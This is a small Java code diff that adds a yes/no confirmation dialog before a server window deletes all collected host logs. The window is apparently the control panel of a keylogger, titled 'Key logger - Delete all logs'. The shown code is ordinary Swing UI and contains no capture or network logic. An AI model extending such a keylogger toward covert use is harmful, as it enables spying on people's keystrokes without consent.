@@ -10,6 +10,7 @@ import javax.swing.BoxLayout;
 import javax.swing.JButton;
 import javax.swing.JFrame;
 import javax.swing.JLabel;
+import javax.swing.JOptionPane;
 import javax.swing.JPanel;
 import javax.swing.JScrollPane;
 import javax.swing.JTextArea;
@@ -121,7 +122,12 @@ public class ServerView extends JFrame implements ActionListener, IServerView {
 			controller.toggleLogger();
 			break;
 		case BTN_DEL_LOG:
-			controller.deleteAllHostLogs();
+			int choosen = JOptionPane.showConfirmDialog(null, "Do you really want to delete all logs",
+					"Key logger - Delete all logs", JOptionPane.YES_NO_OPTION);
+			if (choosen == JOptionPane.YES_OPTION) {
+				controller.deleteAllHostLogs();
+			}
+			
 			break;
 			default: break;
 		}
